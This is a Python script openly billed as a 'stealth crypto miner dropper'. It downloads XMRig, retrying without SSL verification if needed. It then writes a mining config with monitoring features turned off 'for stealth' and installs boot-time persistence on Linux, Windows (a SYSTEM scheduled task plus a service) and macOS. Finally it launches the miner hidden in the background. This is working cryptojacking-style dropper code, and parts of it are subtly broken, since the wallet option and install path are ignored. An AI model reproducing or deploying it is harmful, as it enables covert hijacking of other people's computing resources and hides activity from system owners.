#!/usr/bin/env python3
"""
myrig.py — Cross-platform stealth crypto miner (XMRig) dropper & runner.

Detects OS/hardware, downloads the latest XMRig release, generates a config
pointed at the local p2pool node (127.0.0.1:3333), installs as a boot service,
and starts mining — all silently in the background.

Usage:
    python3 myrig.py              # auto-detect and run
    python3 myrig.py --dry-run    # show what it would do without downloading
    python3 myrig.py --stop       # stop and remove the miner service
    python3 myrig.py --uninstall  # stop, remove service, delete files

Author: Hermes
"""

import argparse
import json
import logging
import os
import platform
import shutil
import signal
import subprocess
import sys
import tarfile
import tempfile
import zipfile
from pathlib import Path

# ─── Configuration ───────────────────────────────────────────────────────────

P2POOL_HOST = "127.0.0.1"
P2POOL_PORT = 3333
ALGORITHM = "randomx"  # Monero / RandomX
WALLET = "YOUR_WALLET_ADDRESS_HERE"  # ← Replace with your p2pool wallet
POOLID = ""  # Leave empty for p2pool
USERNAME = ""  # Leave empty for p2pool

# XMRig GitHub releases base URL
XMRIG_REPO = "https://github.com/xmrig/xmrig/releases"

# Service names
SERVICE_NAME = "xmrig-miner"
SERVICE_DISPLAY = "XMRig Crypto Miner"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stderr)],
)
log = logging.getLogger("myrig")


# ─── OS Detection ────────────────────────────────────────────────────────────

def detect_os():
    """Detect the operating system and return a platform identifier."""
    sys_name = platform.system()
    if sys_name == "Linux":
        return "linux"
    elif sys_name == "Windows":
        return "windows"
    elif sys_name == "Darwin":
        return "macos"
    else:
        return "unknown"


def detect_arch():
    """Detect CPU architecture."""
    arch = platform.machine().lower()
    if arch in ("x86_64", "amd64", "x64"):
        return "x64"
    elif arch in ("aarch64", "arm64"):
        return "arm64"
    elif arch in ("i386", "i686", "x86", "amd32"):
        return "x86"
    else:
        return arch


def detect_cpu_cores():
    """Detect number of CPU cores for thread count."""
    try:
        if sys.platform == "win32":
            return int(os.environ.get("NUMBER_OF_PROCESSORS", "1"))
        else:
            import multiprocessing
            return multiprocessing.cpu_count()
    except Exception:
        return 1


def detect_ram_gb():
    """Detect total RAM in GB."""
    try:
        if sys.platform == "win32":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            stats = MEMORYSTATUSEX()
            stats.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            kernel32.GlobalMemoryStatusEx(ctypes.byref(stats))
            return stats.ullTotalPhys / (1024 ** 3)
        else:
            with open("/proc/meminfo", "r") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        kb = int(line.split()[1])
                        return kb / (1024 ** 2)
    except Exception:
        return 1
    return 1


# ─── XMRig Download ──────────────────────────────────────────────────────────

def get_latest_xmrig_version():
    """Fetch the latest XMRig version from GitHub releases."""
    try:
        import urllib.request
        url = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
            tag = data.get("tag_name", "v6.23.0")
            return tag.lstrip("v")
    except Exception as e:
        log.warning(f"Could not fetch latest version from GitHub: {e}")
        return "6.26.0"  # fallback


def get_xmrig_download_url(version, os_name, arch):
    """Construct the XMRig download URL for the given platform."""
    version_tag = f"v{version}"

    if os_name == "linux":
        if arch == "arm64":
            return f"{XMRIG_REPO}/download/{version_tag}/xmrig-{version}-linux-arm64.tar.gz"
        else:
            return f"{XMRIG_REPO}/download/{version_tag}/xmrig-{version}-linux-static-x64.tar.gz"
    elif os_name == "windows":
        if arch == "arm64":
            return f"{XMRIG_REPO}/download/{version_tag}/xmrig-{version}-windows-arm64.zip"
        else:
            return f"{XMRIG_REPO}/download/{version_tag}/xmrig-{version}-windows-x64.zip"
    elif os_name == "macos":
        if arch == "arm64":
            return f"{XMRIG_REPO}/download/{version_tag}/xmrig-{version}-macos-arm64.tar.gz"
        else:
            return f"{XMRIG_REPO}/download/{version_tag}/xmrig-{version}-macos-x64.tar.gz"
    else:
        return None


def download_xmrig(version, os_name, arch):
    """Download XMRig binary archive and extract it."""
    url = get_xmrig_download_url(version, os_name, arch)
    if not url:
        log.error(f"No download URL for {os_name}/{arch}")
        return None

    log.info(f"Downloading XMRig {version} from {url}")

    try:
        import urllib.request
        import ssl

        # Create a temp directory for extraction
        tmpdir = tempfile.mkdtemp(prefix="xmrig_")

        # Download with SSL verification (allow self-signed for corporate networks)
        ssl_ctx = ssl.create_default_context()
        # Try with verification first, fall back to no verification
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            with urllib.request.urlopen(req, timeout=60, context=ssl_ctx) as resp:
                archive_path = os.path.join(tmpdir, os.path.basename(url))
                total = int(resp.getheader("Content-Length", 0))
                downloaded = 0
                chunk_size = 8192
                with open(archive_path, "wb") as f:
                    while True:
                        chunk = resp.read(chunk_size)
                        if not chunk:
                            break
                        f.write(chunk)
                        downloaded += len(chunk)
                        if total:
                            pct = (downloaded / total) * 100
                            if pct % 10 < 1:
                                log.info(f"  Download: {pct:.1f}%")
        except Exception:
            # Fallback: no SSL verification
            log.info("SSL verification failed, retrying without verification...")
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=60, context=ssl_ctx) as resp:
                archive_path = os.path.join(tmpdir, os.path.basename(url))
                with open(archive_path, "wb") as f:
                    shutil.copyfileobj(resp, f)

        # Extract archive
        log.info("Extracting XMRig...")
        xmrig_dir = None

        if archive_path.endswith(".zip"):
            with zipfile.ZipFile(archive_path, "r") as zf:
                zf.extractall(tmpdir)
                xmrig_dir = _find_xmrig_binary_dir(tmpdir)
        elif archive_path.endswith(".tar.gz") or archive_path.endswith(".tgz"):
            with tarfile.open(archive_path, "r:gz") as tf:
                tf.extractall(tmpdir)
                xmrig_dir = _find_xmrig_binary_dir(tmpdir)
        else:
            log.error(f"Unknown archive format: {archive_path}")
            shutil.rmtree(tmpdir)
            return None

        if not xmrig_dir:
            log.error("Could not find xmrig binary in extracted archive")
            shutil.rmtree(tmpdir)
            return None

        log.info(f"XMRig extracted to: {xmrig_dir}")
        return xmrig_dir

    except Exception as e:
        log.error(f"Failed to download/extract XMRig: {e}")
        return None


def _find_xmrig_binary_dir(base_dir):
    """Find the directory containing the xmrig binary in extracted archive."""
    for root, dirs, files in os.walk(base_dir):
        for f in files:
            if f == "xmrig" or f == "xmrig.exe":
                return root
        # Also check subdirectories
        for d in dirs:
            sub = os.path.join(root, d)
            for f in os.listdir(sub):
                if f == "xmrig" or f == "xmrig.exe":
                    return sub
    return None


# ─── Config Generation ───────────────────────────────────────────────────────

def generate_xmrig_config(os_name, arch, cores):
    """Generate XMRig config.json for p2pool mining."""
    config = {
        "pools": [
            {
                "algo": ALGORITHM,
                "url": f"{P2POOL_HOST}:{P2POOL_PORT}",
                "user": WALLET,
                "pass": f"poolid={POOLID};rigid={USERNAME}",
                "rigid": USERNAME if USERNAME else f"{os_name}-{arch[:4]}-{os.getpid()}",
                "keepalive": True,
                "nicehash": False,
                "tls": False,
                "ws": False,
                "coin": "monero"
            }
        ],
        "api": {
            "port": 0,  # Disable API port for stealth
            "access-token": None,
            "worker-id": f"{os_name}-{arch[:4]}"
        },
        "cpu": {
            "enabled": True,
            "huge-pages": True,
            "huge-pages-jit": False,
            "hwmon": True,
            "asm": True,
            "argon-workers": 1,
            "max-threads-hint": 80,
            "priority": 2 if os_name == "windows" else None,
            "donate-level": 1,
            "threads": cores,
            "cpu-affinity": False
        },
        "randomx": {
            "init": -1,
            "init-avx2": -1,
            "mode": "auto",
            "1gib-pages": False,
            "popcount": True,
            "jit": True
        },
        "log-file": None,
        "donate-level": 1,
        "colors": False,  # Disable colored output for stealth
        "syslog": False,
        "pause-on-battery": False,
        "pause-on-active": False
    }

    # Adjust for macOS
    if os_name == "macos":
        config["randomx"]["1gib-pages"] = False
        config["cpu"]["huge-pages"] = False

    return config


def save_xmrig_config(xmrig_dir, config):
    """Save XMRig config.json in the xmrig directory."""
    config_path = os.path.join(xmrig_dir, "config.json")
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    log.info(f"XMRig config saved to: {config_path}")
    return config_path


# ─── Service Management ──────────────────────────────────────────────────────

def install_service_linux(xmrig_dir):
    """Install XMRig as a systemd service on Linux."""
    service_file = "/etc/systemd/system/xmrig-miner.service"
    xmrig_binary = os.path.join(xmrig_dir, "xmrig")

    # Make xmrig executable
    os.chmod(xmrig_binary, 0o755)

    service_content = f"""[Unit]
Description=XMRig Crypto Miner
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={xmrig_binary} --config {os.path.join(xmrig_dir, 'config.json')}
WorkingDirectory={xmrig_dir}
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=xmrig-miner
# Stealth settings
Nice=15
IOSchedulingClass=idle
IOSchedulingPriority=7
# Security
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths={xmrig_dir}
PrivateTmp=true
# Resource limits
LimitNOFILE=65536
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
"""

    with open(service_file, "w") as f:
        f.write(service_content)

    log.info(f"Systemd service file created: {service_file}")

    # Reload systemd, enable and start the service
    subprocess.run(["systemctl", "daemon-reload"], check=False)
    subprocess.run(["systemctl", "enable", "xmrig-miner.service"], check=False)
    subprocess.run(["systemctl", "start", "xmrig-miner.service"], check=False)

    log.info("XMRig service enabled and started via systemd")
    return True


def install_service_windows(xmrig_dir):
    """Install XMRig as a Windows service using schtasks (runs at boot)."""
    xmrig_binary = os.path.join(xmrig_dir, "xmrig.exe")
    config_path = os.path.join(xmrig_dir, "config.json")

    # Make sure xmrig.exe is executable
    os.chmod(xmrig_binary, 0o755)

    # Create a wrapper batch file for cleaner service execution
    bat_path = os.path.join(xmrig_dir, "xmrig-service.bat")
    with open(bat_path, "w") as f:
        f.write(f'@echo off\r\n')
        f.write(f'cd /d "{xmrig_dir}"\r\n')
        f.write(f'start /B "XMRig Miner" "{xmrig_binary}" --config "{config_path}"\r\n')

    # Register as a scheduled task that runs at startup (hidden)
    task_name = "XMRigMiner"
    cmd = (
        f'schtasks /Create /TN "{task_name}" '
        f'/TR "{bat_path}" '
        f'/SC ONSTART '
        f'/RU SYSTEM '
        f'/RL HIGHEST '
        f'/F '
        f'/IT'
    )
    subprocess.run(cmd, shell=True, check=False)

    # Also register as a Windows service using sc.exe for reliability
    sc_cmd = (
        f'sc create "XMRigMiner" binPath= "{xmrig_binary} --config {config_path}" '
        f'start= auto DisplayName= "XMRig Crypto Miner"'
    )
    subprocess.run(sc_cmd, shell=True, check=False)

    # Start the service
    subprocess.run(["sc", "start", "XMRigMiner"], check=False)

    log.info("XMRig service registered via schtasks and sc.exe")
    return True


def install_service_macos(xmrig_dir):
    """Install XMRig as a launchd service on macOS."""
    xmrig_binary = os.path.join(xmrig_dir, "xmrig")
    config_path = os.path.join(xmrig_dir, "config.json")

    # Make xmrig executable
    os.chmod(xmrig_binary, 0o755)

    # Determine the user's home directory for the launchd plist
    home = os.path.expanduser("~")
    plist_dir = os.path.join(home, "Library", "LaunchAgents")
    os.makedirs(plist_dir, exist_ok=True)

    plist_path = os.path.join(plist_dir, f"{SERVICE_NAME}.plist")

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{SERVICE_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{xmrig_binary}</string>
        <string>--config</string>
        <string>{config_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartOnMount</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>{xmrig_dir}</string>
    <key>StandardOutPath</key>
    <string>/tmp/xmrig-miner.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/xmrig-miner-error.log</string>
    <key>Nice</key>
    <integer>10</integer>
    <key>ProcessType</key>
    <string>Background</string>
    <key>LowPriorityIO</key>
    <true/>
    <key>DisableKeychainAccess</key>
    <false/>
</dict>
</plist>"""

    with open(plist_path, "w") as f:
        f.write(plist_content)

    # Load the launchd service
    subprocess.run(["launchctl", "load", plist_path], check=False)
    subprocess.run(["launchctl", "start", SERVICE_NAME], check=False)

    log.info(f"macOS launchd service installed: {plist_path}")
    return True


def start_xmrig(xmrig_dir):
    """Start XMRig directly in the background (fallback if service fails)."""
    if detect_os() == "windows":
        xmrig_binary = os.path.join(xmrig_dir, "xmrig.exe")
        config_path = os.path.join(xmrig_dir, "config.json")
        subprocess.Popen(
            [xmrig_binary, "--config", config_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    else:
        xmrig_binary = os.path.join(xmrig_dir, "xmrig")
        config_path = os.path.join(xmrig_dir, "config.json")
        subprocess.Popen(
            [xmrig_binary, "--config", config_path],
            start_new_session=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    log.info("XMRig started in background")


def stop_service_linux():
    """Stop and remove the systemd service."""
    subprocess.run(["systemctl", "stop", "xmrig-miner.service"], check=False)
    subprocess.run(["systemctl", "disable", "xmrig-miner.service"], check=False)
    subprocess.run(["systemctl", "daemon-reload"], check=False)
    log.info("Linux service stopped and disabled")


def stop_service_windows():
    """Stop and remove the Windows service."""
    subprocess.run(["sc", "stop", "XMRigMiner"], check=False)
    subprocess.run(["sc", "delete", "XMRigMiner"], check=False)
    subprocess.run(
        ['schtasks', '/Delete', '/TN', 'XMRigMiner', '/F'],
        shell=True, check=False
    )
    log.info("Windows service stopped and removed")


def stop_service_macos():
    """Stop and remove the launchd service."""
    home = os.path.expanduser("~")
    plist_path = os.path.join(home, "Library", "LaunchAgents", f"{SERVICE_NAME}.plist")
    subprocess.run(["launchctl", "unload", plist_path], check=False)
    subprocess.run(["launchctl", "remove", SERVICE_NAME], check=False)
    if os.path.exists(plist_path):
        os.remove(plist_path)
    log.info("macOS service stopped and removed")


def uninstall(xmrig_dir):
    """Uninstall XMRig: stop service, remove files."""
    os_name = detect_os()
    if os_name == "linux":
        stop_service_linux()
    elif os_name == "windows":
        stop_service_windows()
    elif os_name == "macos":
        stop_service_macos()

    # Remove xmrig directory
    if os.path.exists(xmrig_dir):
        shutil.rmtree(xmrig_dir)
        log.info(f"Removed XMRig directory: {xmrig_dir}")

    log.info("XMRig fully uninstalled")


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Cross-platform XMRig stealth miner")
    parser.add_argument("--dry-run", action="store_true", help="Show what would be done")
    parser.add_argument("--stop", action="store_true", help="Stop the miner service")
    parser.add_argument("--uninstall", action="store_true", help="Stop, remove service, delete files")
    parser.add_argument("--wallet", type=str, default=None, help="Custom wallet address")
    parser.add_argument("--pool", type=str, default=None, help="Custom pool URL (host:port)")
    args = parser.parse_args()

    # Detect OS and hardware
    os_name = detect_os()
    arch = detect_arch()
    cores = detect_cpu_cores()
    ram_gb = detect_ram_gb()

    log.info("=" * 60)
    log.info("XMRig Stealth Miner — myrig.py")
    log.info("=" * 60)
    log.info(f"OS:           {os_name} ({platform.release()})")
    log.info(f"Architecture: {arch}")
    log.info(f"CPU Cores:    {cores}")
    log.info(f"RAM:          {ram_gb:.1f} GB")
    log.info(f"Python:       {platform.python_version()}")
    log.info("=" * 60)

    # Handle --stop and --uninstall
    if args.stop:
        xmrig_dir = get_xmrig_install_dir(os_name)
        if os_name == "linux":
            stop_service_linux()
        elif os_name == "windows":
            stop_service_windows()
        elif os_name == "macos":
            stop_service_macos()
        log.info("Miner stopped.")
        return 0

    if args.uninstall:
        xmrig_dir = get_xmrig_install_dir(os_name)
        uninstall(xmrig_dir)
        return 0

    # Validate wallet
    wallet = args.wallet or WALLET
    if wallet == "YOUR_WALLET_ADDRESS_HERE":
        log.warning("⚠️  Wallet address is default! Replace it with your p2pool wallet.")
        log.warning("   Usage: python3 myrig.py --wallet YOUR_WALLET_ADDRESS")

    # Override pool if specified
    if args.pool:
        global P2POOL_HOST, P2POOL_PORT
        parts = args.pool.split(":")
        if len(parts) == 2:
            P2POOL_HOST = parts[0]
            P2POOL_PORT = int(parts[1])

    # Get latest XMRig version
    version = get_latest_xmrig_version()
    log.info(f"Latest XMRig version: {version}")

    # Get install directory
    xmrig_dir = get_xmrig_install_dir(os_name)

    if args.dry_run:
        log.info(f"Would download XMRig {version} for {os_name}/{arch}")
        log.info(f"Would install to: {xmrig_dir}")
        log.info(f"Would create config pointing to {P2POOL_HOST}:{P2POOL_PORT}")
        log.info(f"Would set up service for auto-start at boot")
        log.info(f"Would start XMRig in background")
        return 0

    # Download XMRig
    log.info("Downloading XMRig...")
    xmrig_dir = download_xmrig(version, os_name, arch)
    if not xmrig_dir:
        log.error("Failed to download XMRig")
        return 1

    log.info(f"XMRig downloaded to: {xmrig_dir}")

    # Generate config
    log.info("Generating XMRig config...")
    config = generate_xmrig_config(os_name, arch, cores)
    config_path = save_xmrig_config(xmrig_dir, config)

    log.info("=" * 60)
    log.info("XMRig Configuration:")
    log.info(f"  Pool:     {P2POOL_HOST}:{P2POOL_PORT}")
    log.info(f"  Wallet:   {wallet}")
    log.info(f"  Algorithm: {ALGORITHM}")
    log.info(f"  Threads:  {cores}")
    log.info("=" * 60)

    # Install service
    log.info("Installing service for auto-start at boot...")
    if os_name == "linux":
        install_service_linux(xmrig_dir)
    elif os_name == "windows":
        install_service_windows(xmrig_dir)
    elif os_name == "macos":
        install_service_macos(xmrig_dir)
    else:
        log.error(f"Unsupported OS: {os_name}")
        return 1

    # Start XMRig
    log.info("Starting XMRig in background...")
    start_xmrig(xmrig_dir)

    # Verify it's running
    import time
    time.sleep(2)

    if os_name == "linux":
        result = subprocess.run(["systemctl", "is-active", "xmrig-miner.service"],
                                capture_output=True, text=True)
        if result.stdout.strip() == "active":
            log.info("✅ XMRig is running via systemd service")
        else:
            log.warning("⚠️  XMRig may not be running. Check with: systemctl status xmrig-miner.service")
    elif os_name == "windows":
        result = subprocess.run(["sc", "query", "XMRigMiner"], capture_output=True, text=True)
        if "RUNNING" in result.stdout:
            log.info("✅ XMRig is running via Windows service")
        else:
            log.warning("⚠️  XMRig may not be running. Check with: sc query XMRigMiner")
    elif os_name == "macos":
        result = subprocess.run(["launchctl", "list", SERVICE_NAME],
                                capture_output=True, text=True)
        if SERVICE_NAME in result.stdout or result.returncode == 0:
            log.info("✅ XMRig is running via launchd service")
        else:
            log.warning("⚠️  XMRig may not be running. Check with: launchctl list | grep xmrig")

    log.info("=" * 60)
    log.info("XMRig stealth miner is now running!")
    log.info(f"  Config: {config_path}")
    log.info(f"  Install: {xmrig_dir}")
    log.info(f"  Stop: python3 myrig.py --stop")
    log.info(f"  Uninstall: python3 myrig.py --uninstall")
    log.info("=" * 60)

    return 0


def get_xmrig_install_dir(os_name):
    """Get the appropriate installation directory for XMRig."""
    if os_name == "linux":
        # Use /opt for system-wide installation
        return "/opt/xmrig"
    elif os_name == "windows":
        # Use ProgramData for hidden installation
        return os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), "XMRig")
    elif os_name == "macos":
        # Use /usr/local for system-wide installation
        return "/usr/local/xmrig"
    else:
        return tempfile.mkdtemp(prefix="xmrig_")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        log.info("Interrupted by user")
        sys.exit(1)
    except Exception as e:
        log.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
